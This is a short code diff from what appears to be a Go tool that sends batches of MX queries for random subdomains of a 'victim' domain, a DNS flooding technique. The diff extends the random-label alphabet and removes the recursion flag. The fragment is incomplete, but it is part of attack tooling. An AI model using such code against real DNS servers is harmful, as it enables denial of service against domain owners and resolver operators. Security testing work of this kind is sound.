@@ -13,7 +13,7 @@ type DNSClient struct {
 	client   *dns.Client
 }
 
-var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
+var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
 
 func NewDNSClient(hostPort string) (c DNSClient) {
 	client := new(dns.Client)
@@ -28,7 +28,6 @@ func (c DNSClient) SendJunkDomainsRequest(nQuestions int, victimDomain string) (
 	for i := 0; i < nQuestions; i++ {
 		m.SetQuestion(dns.CanonicalName(c.randomDomain(victimDomain)), dns.TypeMX)
 	}
-	m.RecursionDesired = true
 	r, rtt, err := c.client.Exchange(m, c.hostPort)
 	if err != nil {
 		return
